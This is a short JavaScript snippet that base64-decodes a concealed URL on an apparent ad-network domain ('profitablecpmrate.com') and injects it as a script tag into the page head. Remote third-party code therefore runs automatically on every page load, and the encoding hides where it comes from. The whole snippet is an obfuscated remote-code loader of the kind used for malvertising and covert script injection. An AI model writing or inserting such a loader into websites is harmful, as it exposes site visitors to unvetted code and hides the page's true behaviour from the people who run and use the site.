var encodedURL = "Ly9wbDI1Nzg2NzA1LnByb2ZpdGFibGVjcG1yYXRlLmNvbS8zNi9lMy9lZi8zNmUzZWZiNzJjYmVjOTFkZjE2ZDRmNTAyMTViMjBiOS5qcw==";
var decodedURL = atob(encodedURL);

var script = document.createElement("script");
script.type = "text/javascript";
script.src = decodedURL;
document.head.appendChild(script);
